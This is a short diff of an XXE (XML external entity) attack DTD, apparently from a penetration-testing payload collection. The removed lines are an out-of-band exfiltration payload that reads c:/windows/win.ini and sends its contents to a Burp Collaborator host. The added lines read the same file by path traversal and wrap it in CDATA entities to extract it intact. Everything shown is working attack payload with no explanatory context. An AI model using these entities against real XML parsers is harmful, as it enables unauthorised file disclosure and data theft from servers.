@@ -1,3 +1,5 @@
-<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://p7xv38s1k35hsjfm7iqj51jzfqli97.burpcollaborator.net/?%file;'>">
-%all;
+<!ENTITY % targetFile SYSTEM "file:///../../../../../../../../../windows/win.ini">
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % end "]]>">
+<!ENTITY % everything "<!ENTITY wrappedFile '%start;%targetFile;
+    %end;'>">
